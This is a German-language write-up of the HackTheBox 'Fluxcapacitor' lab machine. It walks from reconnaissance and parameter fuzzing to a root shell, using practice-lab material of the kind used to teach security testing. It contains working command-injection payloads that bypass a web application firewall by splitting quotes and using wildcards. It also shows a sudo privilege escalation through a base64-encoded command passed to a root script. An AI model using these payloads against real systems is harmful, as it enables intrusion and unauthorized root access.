---
title: "HackTheBox Fluxcapacitator"
date: 2010-01-01T01:01:56+01:00
toc: false
images:
tags:
  - hackthebox
  - ctf
---

[![Kurzes Video Walkthrough ohne Erklärungen](http://img.youtube.com/vi/YOUTUBE_VIDEO_ID_HERE/0.jpg)](http://www.youtube.com/watch?v=YOUTUBE_VIDEO_ID_HERE)

# HackTheBox – Fluxcapacitor WriteUp | Tipps + Anleitung | htb

[Fluxcapacitor](https://www.hackthebox.eu/home/machines/profile/119) ist eine der vielen Verfügbaren CTF Challenges von [HackTheBox](https://hackthebox.eu/). [Fluxcapacitor](https://www.hackthebox.eu/home/machines/profile/119) ist eine leichte bis mittelschwere Maschine von [HackTheBox](https://hackthebox.eu/).

![difficulty](https://imgur.com/RxixV0o.jpg)

## **Tipps**

[su_spoiler title="Tipp 1" open="no" style="fancy" icon="plus" anchor="" class=""]

[/su_spoiler]

[su_spoiler title="Tipp 2" open="no" style="fancy" icon="plus" anchor="" class=""]

[/su_spoiler]

[su_spoiler title="Tipp 3" open="no" style="fancy" icon="plus" anchor="" class=""]

[/su_spoiler]

[su_spoiler title="Tipp 4" open="no" style="fancy" icon="plus" anchor="" class=""]

[/su_spoiler]

[su_spoiler title="Tipp 5" open="no" style="fancy" icon="plus" anchor="" class=""]

[/su_spoiler]

## **Video**

[su_spoiler title="Kurzes Video Walkthrough ohne Erklärungen" open="no" style="fancy" icon="plus" anchor="" class=""]

<iframe width="560" height="314" src="//www.youtube.com/embed/vVZhVhoMKkY" allowfullscreen="allowfullscreen"></iframe>

[/su_spoiler]

## **Anleitung**

[su_spoiler title="Schritt 1" open="no" style="fancy" icon="plus" anchor="" class=""]

Beginnen wir wie gewohnt mit einem Nmap-Scan um herauszufinden welche Ports offen sind. Dabei können wir das Argument **-sV** benutzen, um uns die genaue Bezeichnung und die Version der Service anzeigen zu lassen.

<pre class="lang:default mark:7 decode:true">root@kali:~# nmap -sV 10.10.10.69
Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-14 14:55 EDT
Nmap scan report for 10.10.10.69
Host is up (0.052s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    SuperWAF</pre>

Auf Port 80 läuft ein Webserver. Allerdings steht bei der Version nur **SuperWAF**. [WAF](https://de.wikipedia.org/wiki/Web_Application_Firewall) steht für Web Application Firewall und ist unter dafür da um Webanwendungen vor Angriffen wie z.B. SQL Injection, XSS, Parameter Tampering oder Command Injection zu schützen.

[/su_spoiler]

[su_spoiler title="Schritt 2" open="no" style="fancy" icon="plus" anchor="" class=""]

Sehen wir uns doch mal an was sich auf dem Webserver befindet.

![website](https://imgur.com/w2vNpK6.jpg)

Nichts interessantes hier, wie sieht es mit dem Seitenquelltext (Strg + U) aus?

<pre class="lang:default mark:10 decode:true "><!DOCTYPE html>
<html>
<head>
<title>Keep Alive</title>
</head>
<body>
OK: node1 alive
<!--
Please, add timestamp with something like:
<script> $.ajax({ type: "GET", url: '/sync' }); </script>
-->
<hr/>
FluxCapacitor Inc. info@fluxcapacitor.htb - http://fluxcapacitor.htb<br>
<em><met><doc><brown>Roads? Where we're going, we don't need roads.</brown></doc></met></em>
</body>
</html></pre>

Ein Verweis auf die Url **/sync**.

[/su_spoiler]

[su_spoiler title="Schritt 3" open="no" style="fancy" icon="plus" anchor="" class=""]

Wenn wir **http://10.10.10.69/sync** besuchen, bekommen wir die Rückmeldung **443 - Access Forbidden**.  
Wahrscheinlich verhindert die WAF, dass wir auf die Seite zugreifen können.

Können wir mit **curl** darauf zugreifen?

<pre class="lang:default decode:true ">root@kali:~# curl http://10.10.10.69/sync
20180514T20:56:52</pre>

Mit **curl** funktioniert es. Wir bekommen Datum und Uhrzeit zurück.

[/su_spoiler]

[su_spoiler title="Schritt 4" open="no" style="fancy" icon="plus" anchor="" class=""]

Warum uns der Zugriff verwehrt wird, wenn wir einen Internet-Browser benutzen, aber nicht wenn wir curl benutzen, kann mehrere Gründe haben.  
Darüber können wir uns aber später kümmern.

Vielleicht können wir /sync einen Parameter übergeben und dies ausnutzen um z.B. Code auszuführen (Command Injection).  
Um mögliche Parameter herauszufinden, können wir einen Fuzzer wie z.B. **wfuzz** benutzen.  
Wfuzz kannst du ganz einfach mit **apt install wfuzz** installieren.

**-c** sorgt dafür, dass wir einen farbigen output bekommen.  
Mit **-t** können wir angeben wie viele gleichzeitige Verbindungen hergestellt werden sollen  
**FUZZ** wird durch die Begriffe aus der Wörterliste ersetzt.

<pre class="lang:default decode:true">root@kali:~# wfuzz -c -t 50 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt "http://10.10.10.69/sync?FUZZ=test"

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.2.9 - The Web Fuzzer *
********************************************************

Target: http://10.10.10.69/sync?FUZZ=test
Total requests: 81643

==================================================================
ID Response Lines Word Chars Payload
==================================================================

000038: C=200 2 L 1 W 19 Ch "home"
000039: C=200 2 L 1 W 19 Ch "img"
000040: C=200 2 L 1 W 19 Ch "default"
000041: C=200 2 L 1 W 19 Ch "2005"
000042: C=200 2 L 1 W 19 Ch "products"
000043: C=200 2 L 1 W 19 Ch "sitemap"

</pre>

Die Standard-Antwort für ungültige Parameter scheint 19 Zeichen lang zu sein. Mit Hilfe von **--hh 19** können wir alle Wörter nicht anzeigen lassen, welche zu einer 19 Zeichen langen Antwort führen.

Lassen wir wfuzz jetzt nochmal starten.

<pre class="lang:default mark:16 decode:true">root@kali:~# wfuzz -c -t 50 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt --hh 19 "http://10.10.10.69/sync?FUZZ=test"

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.2.9 - The Web Fuzzer *
********************************************************

Target: http://10.10.10.69/sync?FUZZ=test
Total requests: 81643

==================================================================
ID Response Lines Word Chars Payload
==================================================================

009938: C=403 7 L 10 W 175 Ch "opt"

Total time: 808.8355
Processed Requests: 81643
Filtered Requests: 81642
Requests/sec.: 100.9389</pre>

Ein Parameter wurde gefunden, welcher eine 175 Zeichen lange Antwort hervorgerufen hat.

[/su_spoiler]

[su_spoiler title="Schritt 5" open="no" style="fancy" icon="plus" anchor="" class=""]

Jetzt wo wir einen gültigen Parameter wissen, den wir übergeben können, können wir Command Injection ausprobieren.

Ich werde dafür Burp benutzen, man kann dafür aber auch z.B. Curl benutzen (curl "http://10.10.10.69/sync?opt=BEFEHL").

Wenn wir Burp geöffnet haben, können wir http://10.10.10.69/sync?opt= im Browser öffnen. Burp wird diese Anfrage abfangen. Wenn wir Rechtsklick darauf machen können wir **Send to Repeater **auswählen oder einfach **Strg + R** drücken.

Dann können wir zu dem Repeater Tab öffnen und dort die Anfrage bearbeiten und immer wieder absenden. Rechts sehen wir dann die Antwort.

Wenn wir **/sync?opt=ls** probieren, bekommen wir wieder nur **403 Forbidden** zurück. Die WAF hat wahrscheinlich unseren Versuch einen Befehl auszuführen erkannt und verhindert diesen.

[/su_spoiler]

[su_spoiler title="Schritt 6" open="no" style="fancy" icon="plus" anchor="" class=""]

TheMiddle, der Ersteller von FluxCapacitor, hat zwei Artikel in denen er Techniken zur Umgehung der WAF erklärt (**WAF Evasion Techniques**). Der erste Artikel ist [hier](https://medium.com/secjuice/waf-evasion-techniques-718026d693d8) und der zweite [hier](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0).

/sync?opt=' l's'

[...]  
home  
[...]  
root  
[...]

/sync?opt=' l's' /home'

FluxCapacitorInc  
themiddle

/sync?opt=' l's' /home/FluxCapacitorInc'

403 Forbidden

/sync?opt=' l's' /home/F???Capacitor???'

user.txt

/sync?opt=' c'a't /home/F???Capacitor???/u???.txt'

b8b 7bc

/sync?opt=' s'ud'o -l'

[...]

User nobody may run the following commands on fluxcapacitor:  
(ALL) ALL  
(root) NOPASSWD: /home/themiddle/.monit

/sync?opt=' c'a't /home/themiddle/.monit'

#!/bin/bash

if [ "$1" == "cmd" ]; then

echo "Trying to execute ${2}"  
CMD=$(echo -n ${2} | base64 -d)  
bash -c "$CMD"  
fi

<pre class="lang:default decode:true">root@kali:~# echo "cat /root/root.txt" | base64
Y2F0IC9yb290L3Jvb3QudHh0Cg==</pre>

/sync?opt=' 's'ud'o' /home/themiddle/.monit cmd Y2F0IC9yb290L3Jvb3QudHh0Cg=='

Trying to execute Y2F0IC9yb290L3Jvb3QudHh0Cg==  
bdc 30e